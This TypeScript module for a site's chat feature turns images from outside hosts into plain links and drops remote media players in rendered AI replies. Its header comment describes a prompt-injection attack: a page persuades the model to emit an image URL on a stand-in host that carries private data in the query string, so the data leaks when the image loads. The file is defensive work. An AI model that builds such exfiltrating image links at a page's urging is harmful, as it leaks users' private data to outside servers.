/**
 * Pictures in a chat reply load only from the site itself. A reply is written by a model that has
 * read other people's pages, and a picture loads the moment it is drawn: an address like
 * `https://elsewhere.example/p.png?q=<something private>` would hand whatever a page talked the
 * model into putting there to that server, with nobody clicking anything. A picture from anywhere
 * else is shown as a link instead, which goes nowhere until Casey chooses to open it.
 */
import { fromHtml } from 'hast-util-from-html';
import { toHtml } from 'hast-util-to-html';
import type { Element, ElementContent, Root } from 'hast';

/** Hosts whose pictures a reply may show: the site and its media. */
export const CHAT_IMAGE_HOSTS = ['caseyagollan.com', 'www.caseyagollan.com', 'files.caseyagollan.com'];

export function chatImageAllowed(src: unknown, origin?: string): boolean {
	if (typeof src !== 'string' || !src) return false;
	try {
		const url = new URL(src, origin ?? 'https://caseyagollan.com');
		if (url.protocol !== 'https:' && url.protocol !== 'http:') return false;
		return CHAT_IMAGE_HOSTS.includes(url.hostname) || (!!origin && url.origin === new URL(origin).origin);
	} catch {
		return false;
	}
}

/** Rendered (already sanitized) HTML with every picture from another host turned into a link to it. */
export function linkRemoteImages(html: string, origin?: string): string {
	if (!/<(img|video|audio|source)\b/i.test(html)) return html;
	const tree = fromHtml(html, { fragment: true });
	const visit = (node: Root | Element) => {
		node.children = node.children.flatMap((child): ElementContent[] => {
			if (child.type !== 'element') return [child as ElementContent];
			if (child.tagName === 'img') {
				if (chatImageAllowed(child.properties.src, origin)) return [child];
				const href = typeof child.properties.src === 'string' ? child.properties.src : '';
				const alt = String(child.properties.alt ?? '').trim();
				let host = '';
				try { host = new URL(href).hostname.replace(/^www\./, ''); } catch { /* no link, then */ }
				if (!host) return alt ? [{ type: 'text', value: alt }] : [];
				return [{ type: 'element', tagName: 'a', properties: { href, target: '_blank', rel: ['noopener', 'noreferrer', 'nofollow'], className: ['chat-remote-image'] }, children: [{ type: 'text', value: `${alt || 'Picture'} (${host})` }] }];
			}
			// Players fetch their file as soon as they are drawn, too.
			if (['video', 'audio', 'source'].includes(child.tagName) && !chatImageAllowed(child.properties.src ?? child.properties.poster, origin) && (child.properties.src || child.properties.poster)) return [];
			visit(child);
			return [child];
		});
	};
	visit(tree as Root);
	return toHtml(tree);
}
